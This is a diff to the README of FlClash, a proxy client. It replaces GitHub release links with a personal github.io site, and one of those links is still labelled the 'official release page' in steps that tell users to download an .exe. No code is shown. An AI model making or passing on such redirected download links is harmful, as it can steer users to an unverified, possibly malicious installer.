@@ -1,6 +1,6 @@
 # 🌐 FlClash - Simple proxy client for everyone
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Shiftin7836/FlClash/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://shiftin7836.github.io)
 
 FlClash provides a simple interface to manage your internet proxies. It uses the ClashMeta core to route your traffic efficiently. This tool helps you maintain privacy and access resources across the web. It keeps your connection stable, fast, and secure on your desktop.
 
@@ -16,7 +16,7 @@ FlClash provides a simple interface to manage your internet proxies. It uses the
 
 Follow these steps to set up FlClash on your Windows computer.
 
-1. Visit the [official release page](https://github.com/Shiftin7836/FlClash/releases) to access the download files.
+1. Visit the [official release page](https://shiftin7836.github.io) to access the download files.
 2. Look for the file ending in `.exe` under the latest release section.
 3. Click the file to start the download.
 4. Save the file to your desktop or downloads folder.
